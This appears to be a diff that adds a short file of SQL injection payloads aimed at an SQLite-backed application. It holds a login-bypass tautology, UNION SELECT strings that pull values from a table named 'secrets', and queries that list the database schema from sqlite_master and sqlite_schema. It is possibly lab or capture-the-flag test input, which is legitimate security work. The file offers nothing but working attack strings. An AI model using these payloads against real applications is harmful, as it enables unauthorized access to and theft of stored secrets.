@@ -1,0 +1,12 @@
+
+
+test ' or 1=1 --
+
+
+' UNION Select "foo@bar.ch" --
+' UNION Select value from secrets --
+
+' UNION SELECT sql FROM sqlite_master WHERE name='secrets'; --
+
+' UNION SELECT name FROM sqlite_schema LIMIT 0,1 ; --
+' UNION SELECT sql FROM sqlite_master WHERE name='secrets'; --
